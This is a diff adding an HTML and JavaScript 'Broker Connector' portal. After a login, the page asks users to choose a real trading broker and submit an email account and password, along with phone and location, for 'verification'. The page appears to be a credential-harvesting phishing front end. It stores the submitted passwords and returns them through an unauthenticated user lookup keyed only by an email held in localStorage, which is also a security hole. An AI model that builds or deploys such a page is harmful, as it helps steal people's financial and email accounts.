@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>broker connector</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body {
+            background: linear-gradient(rgba(13, 13, 26, 0.85), rgba(13, 13, 26, 0.85)), 
+                        url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=1920&auto=format&fit=crop') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 20px;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1000px;
+            width: 100%;
+            margin: 0 auto;
+            background: rgba(26, 26, 46, 0.7);
+            backdrop-filter: blur(10px);
+            padding: 15px 30px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .brand { display: flex; align-items: center; gap: 12px; }
+        .brand-icon {
+            width: 36px; height: 36px;
+            background: linear-gradient(135deg, #8b5cf6, #6366f1);
+            border-radius: 8px;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: bold; font-size: 18px; color: #fff;
+            box-shadow: 0 0 15px rgba(139, 92, 246, 0.5);
+        }
+        .brand-text h1 { font-size: 18px; color: #fff; letter-spacing: 0.5px; }
+        .brand-text span { font-size: 11px; color: #a5b4fc; text-transform: uppercase; letter-spacing: 1px; }
+
+        .main-container {
+            max-width: 600px;
+            width: 100%;
+            margin: 40px auto;
+            background: rgba(26, 26, 46, 0.85);
+            backdrop-filter: blur(16px);
+            padding: 40px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
+
+        h2 { color: #f3f4f6; text-align: center; margin-bottom: 8px; font-size: 24px; }
+        p.subtitle { color: #9ca3af; text-align: center; margin-bottom: 30px; font-size: 14px; }
+
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-size: 13px; color: #d1d5db; font-weight: 500; }
+        input, select {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(15, 15, 30, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #8b5cf6;
+            box-shadow: 0 0 10px rgba(139, 92, 246, 0.3);
+        }
+        select option { background: #1a1a2e; color: #fff; }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #7c3aed, #4f46e5);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.4);
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #6d28d9, #4338ca);
+            box-shadow: 0 6px 20px rgba(124, 58, 237, 0.6);
+            transform: translateY(-1px);
+        }
+
+        .switch-text { text-align: center; margin-top: 20px; font-size: 13px; color: #9ca3af; }
+        .switch-text a { color: #a78bfa; text-decoration: none; font-weight: 600; cursor: pointer; }
+        .switch-text a:hover { text-decoration: underline; }
+
+        .hidden { display: none !important; }
+
+        .status-box {
+            background: rgba(15, 15, 30, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 13px;
+            margin-top: 8px;
+            text-transform: uppercase;
+        }
+        .status-none { background: rgba(107, 114, 128, 0.3); color: #9ca3af; }
+        .status-pending { background: rgba(234, 179, 8, 0.2); color: #facc15; border: 1px solid rgba(234, 179, 8, 0.4); }
+        .status-verified { background: rgba(34, 197, 94, 0.2); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.4); }
+        .status-declined { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.4); }
+
+        .info-card {
+            background: rgba(15, 15, 30, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #d1d5db;
+        }
+        .info-card p { margin-bottom: 8px; }
+        .info-card p:last-child { margin-bottom: 0; }
+
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: #1e1e38; padding: 30px; border-radius: 12px; text-align: center; max-width: 380px; width: 100%; border: 1px solid rgba(139, 92, 246, 0.4); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .modal-content p { color: #fff; font-size: 15px; margin-bottom: 20px; line-height: 1.5; }
+        .modal-content button { background: #7c3aed; width: 100%; padding: 10px; font-size: 14px; border: none; border-radius: 6px; color: #fff; font-weight: 600; cursor: pointer; }
+        .modal-content button:hover { background: #6d28d9; }
+
+        footer { text-align: center; font-size: 12px; color: #6b7280; padding: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="navbar">
+        <div class="brand">
+            <div class="brand-icon">⚡</div>
+            <div class="brand-text">
+                <h1>BROKER CONNECTOR</h1>
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div id="login-view">
+            <h2>Client Portal Login</h2>
+            <p class="subtitle">Access your account to submit details and to your broker</p>
+            <div class="form-group">
+                <label>Email or Username</label>
+                <input type="text" id="login-identifier" placeholder="Enter your email or username">
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="login-password" placeholder="Enter your password">
+            </div>
+            <button class="btn-primary" onclick="loginUser()">Sign In</button>
+            <div class="switch-text">Don't have an account? <a onclick="showRegister()">Register here</a></div>
+        </div>
+
+        <div id="register-view" class="hidden">
+            <h2>Create Account</h2>
+            <p class="subtitle">Fill in your information to register a new account.</p>
+            <div class="form-group"><label>Full Name</label><input type="text" id="reg-name" placeholder="John Doe"></div>
+            <div class="form-group"><label>Email Address</label><input type="text" id="reg-email" placeholder="john@example.com"></div>
+            <div class="form-group"><label>Phone Number</label><input type="text" id="reg-phone" placeholder="+1 555-0192"></div>
+            <div class="form-group"><label>Date of Birth</label><input type="text" id="reg-dob" placeholder="YYYY-MM-DD"></div>
+            <div class="form-group"><label>Password</label><input type="password" id="reg-pass" placeholder="Create a password"></div>
+            <div class="form-group"><label>Confirm Password</label><input type="password" id="reg-confirm" placeholder="Confirm your password"></div>
+            <button class="btn-primary" onclick="registerUser()">Register Account</button>
+            <div class="switch-text">Already have an account? <a onclick="showLogin()">Sign In</a></div>
+        </div>
+
+        <div id="dashboard-view" class="hidden">
+            <h2>Connect</h2>
+            <p class="subtitle" id="welcome-msg">Welcome</p>
+
+            <div id="submit-section">
+                <div class="form-group">
+                    <label>Select Trading Broker</label>
+                    <select id="sub-broker">
+                        <option value="">-- Choose your Broker --</option>
+                        <option value="IG Group">IG Group</option>
+                        <option value="Interactive Brokers">Interactive Brokers</option>
+                        <option value="Saxo Bank">Saxo Bank</option>
+                        <option value="CMC Markets">CMC Markets</option>
+                        <option value="XTB">XTB</option>
+                        <option value="OANDA">OANDA</option>
+                        <option value="Forex.com">Forex.com (Gain Capital)</option>
+                        <option value="Pepperstone">Pepperstone</option>
+                        <option value="IC Markets">IC Markets</option>
+                        <option value="FP Markets">FP Markets</option>
+                        <option value="Exness">Exness</option>
+                        <option value="FXTM">FXTM (ForexTime)</option>
+                        <option value="Avatrade">AvaTrade</option>
+                    </select>
+                </div>
+                <div class="form-group"><label>Mobile Number</label><input type="text" id="sub-mobile" placeholder="+1 555-0192"></div>
+                <div class="form-group"><label>Country</label><input type="text" id="sub-country" placeholder="e.g., United States / Kenya"></div>
+                <div class="form-group"><label>City</label><input type="text" id="sub-city" placeholder="e.g., New York / Nairobi"></div>
+                <div class="form-group"><label>Area of Residence</label><input type="text" id="sub-area" placeholder="e.g., Downtown / Westlands"></div>
+                <div class="form-group"><label>Email Account</label><input type="text" id="sub-email" placeholder="Enter email "></div>
+                <div class="form-group"><label>Password</label><input type="password" id="sub-pass" placeholder="Enter password"></div>
+                <button class="btn-primary" onclick="submitData()">Connect</button>
+            </div>
+
+            <button onclick="logoutClient()" style="margin-top: 30px; background: rgba(239, 68, 68, 0.2); border: 1px solid rgba(239, 68, 68, 0.4); color: #f87171; width: 100%; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">Logout</button>
+        </div>
+
+        <div id="account-status-view" class="hidden">
+            <h2>Pofile Account & Status Dashboard</h2>
+            <p class="subtitle">Your profile information and current verification status.</p>
+
+            <div class="status-box">
+                <label style="margin-bottom: 5px; color: #9ca3af;">Current Account Status</label>
+                <div id="status-display" class="status-badge status-none">NONE</div>
+            </div>
+
+            <div class="info-card">
+                <p><b>Full Name:</b> <span id="acc-name">-</span></p>
+                <p><b>Account Email:</b> <span id="acc-email">-</span></p>
+                <p><b>Phone:</b> <span id="acc-phone">-</span></p>
+                <p><b>Broker:</b> <span id="acc-broker">-</span></p>
+                <p><b>Mobile:</b> <span id="acc-mobile">-</span></p>
+                <p><b>Location:</b> <span id="acc-location">-</span></p>
+            </div>
+
+            <button class="btn-primary" onclick="showSubmitForm()">Edit My Details</button>
+            <button onclick="logoutClient()" style="margin-top: 15px; background: rgba(239, 68, 68, 0.2); border: 1px solid rgba(239, 68, 68, 0.4); color: #f87171; width: 100%; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">Logout</button>
+        </div>
+    </div>
+
+    <div id="custom-modal" class="modal-overlay hidden">
+        <div class="modal-content">
+            <p id="modal-message">Message here</p>
+            <button onclick="closeModal()">OK</button>
+        </div>
+    </div>
+
+    <footer>&copy; 2026 ConnectPortal &bull; Verification System</footer>
+
+    <script>
+        const API = "/api";
+        let currentUserEmail = localStorage.getItem('client_email') || null;
+        let cachedUserData = null;
+
+        window.onload = () => { if (currentUserEmail) { fetchUserData(currentUserEmail); } };
+
+        function showRegister() { document.getElementById('login-view').classList.add('hidden'); document.getElementById('register-view').classList.remove('hidden'); }
+        function showLogin() { document.getElementById('register-view').classList.add('hidden'); document.getElementById('login-view').classList.remove('hidden'); }
+        
+        function showSubmitForm() {
+            document.getElementById('account-status-view').classList.add('hidden');
+            document.getElementById('dashboard-view').classList.remove('hidden');
+            if (cachedUserData && cachedUserData.submittedData) {
+                document.getElementById('sub-broker').value = cachedUserData.submittedData.broker || '';
+                document.getElementById('sub-mobile').value = cachedUserData.submittedData.mobile || '';
+                document.getElementById('sub-country').value = cachedUserData.submittedData.country || '';
+                document.getElementById('sub-city').value = cachedUserData.submittedData.city || '';
+                document.getElementById('sub-area').value = cachedUserData.submittedData.area || '';
+                document.getElementById('sub-email').value = cachedUserData.submittedData.submissionEmail || '';
+                document.getElementById('sub-pass').value = cachedUserData.submittedData.submissionPassword || '';
+            }
+        }
+
+        async function registerUser() {
+            const fullName = document.getElementById('reg-name').value.trim();
+            const email = document.getElementById('reg-email').value.trim();
+            const phone = document.getElementById('reg-phone').value.trim();
+            const dob = document.getElementById('reg-dob').value.trim();
+            const password = document.getElementById('reg-pass').value;
+            const confirmPassword = document.getElementById('reg-confirm').value;
+
+            if (!fullName || !email || !password) { showModal("Please fill in all required fields."); return; }
+
+            try {
+                const res = await fetch(`${API}/register`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ fullName, email, phone, dob, password, confirmPassword })
+                });
+                const data = await res.json();
+                showModal(data.message);
+                if (data.success) { showLogin(); }
+            } catch (err) { showModal("Error connecting to server."); }
+        }
+
+        async function loginUser() {
+            const identifier = document.getElementById('login-identifier').value.trim();
+            const password = document.getElementById('login-password').value;
+
+            if (!identifier || !password) { showModal("Please enter login credentials."); return; }
+
+            try {
+                const res = await fetch(`${API}/login`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ identifier, password })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    currentUserEmail = data.user.email;
+                    localStorage.setItem('client_email', currentUserEmail);
+                    evaluateView(data.user);
+                } else { showModal(data.message); }
+            } catch (err) { showModal("Error connecting to server."); }
+        }
+
+        async function fetchUserData(email) {
+            try {
+                const res = await fetch(`${API}/user/${email}`);
+                const data = await res.json();
+                if (data.success) { evaluateView(data.user); } else { logoutClient(); }
+            } catch (err) { console.error(err); }
+        }
+
+        function evaluateView(user) {
+            cachedUserData = user;
+            document.getElementById('login-view').classList.add('hidden');
+            document.getElementById('register-view').classList.add('hidden');
+
+            if (user.submittedData && user.submittedData.submissionEmail) {
+                loadAccountStatus(user);
+            } else {
+                loadDashboard(user);
+            }
+        }
+
+        function loadDashboard(user) {
+            document.getElementById('account-status-view').classList.add('hidden');
+            document.getElementById('dashboard-view').classList.remove('hidden');
+            document.getElementById('welcome-msg').innerText = `Welcome, ${user.fullName} (${user.email})`;
+        }
+
+        function loadAccountStatus(user) {
+            document.getElementById('dashboard-view').classList.add('hidden');
+            document.getElementById('login-view').classList.add('hidden');
+            document.getElementById('register-view').classList.add('hidden');
+            document.getElementById('account-status-view').classList.remove('hidden');
+
+            document.getElementById('acc-name').innerText = user.fullName || '-';
+            document.getElementById('acc-email').innerText = user.email || '-';
+            document.getElementById('acc-phone').innerText = user.phone || '-';
+            
+            const subData = user.submittedData || {};
+            document.getElementById('acc-broker').innerText = subData.broker || '-';
+            document.getElementById('acc-mobile').innerText = subData.mobile || '-';
+            document.getElementById('acc-location').innerText = `${subData.area || ''}, ${subData.city || ''}, ${subData.country || ''}`.replace(/^, |, $/, '') || '-';
+
+            const badge = document.getElementById('status-display');
+            badge.innerText = (user.status || 'none').toUpperCase();
+            badge.className = `status-badge status-${user.status || 'none'}`;
+        }
+
+        async function submitData() {
+            const broker = document.getElementById('sub-broker').value;
+            const mobile = document.getElementById('sub-mobile').value.trim();
+            const country = document.getElementById('sub-country').value.trim();
+            const city = document.getElementById('sub-city').value.trim();
+            const area = document.getElementById('sub-area').value.trim();
+            const submissionEmail = document.getElementById('sub-email').value.trim();
+            const submissionPassword = document.getElementById('sub-pass').value;
+
+            if (!broker || !submissionEmail || !submissionPassword) {
+                showModal("Please select a broker and fill in your email and password.");
+                return;
+            }
+
+            try {
+                const res = await fetch(`${API}/submit`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        email: currentUserEmail, 
+                        submittedData: { broker, mobile, country, city, area, submissionEmail, submissionPassword } 
+                    })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    showModal("Congratulations! Your connection data has been received. Please wait for verification.", async () => {
+                        try {
+                            const userRes = await fetch(`${API}/user/${currentUserEmail}`);
+                            const userData = await userRes.json();
+                            if (userData.success) {
+                                loadAccountStatus(userData.user);
+                            }
+                        } catch (e) { console.error(e); }
+                    });
+                } else { 
+                    showModal(data.message); 
+                }
+            } catch (err) { 
+                showModal("Error submitting data."); 
+            }
+        }
+
+        function logoutClient() {
+            localStorage.removeItem('client_email');
+            currentUserEmail = null;
+            cachedUserData = null;
+            document.getElementById('dashboard-view').classList.add('hidden');
+            document.getElementById('account-status-view').classList.add('hidden');
+            document.getElementById('login-view').classList.remove('hidden');
+            document.getElementById('login-identifier').value = "";
+            document.getElementById('login-password').value = "";
+        }
+
+        let modalCallback = null;
+        function showModal(message, callback = null) {
+            modalCallback = callback;
+            document.getElementById('modal-message').innerText = message;
+            document.getElementById('custom-modal').classList.remove('hidden');
+        }
+
+        function closeModal() {
+            document.getElementById('custom-modal').classList.add('hidden');
+            if (modalCallback) { 
+                modalCallback(); 
+                modalCallback = null; 
+            }
+        }
+    </script>
+</body>
+</html>
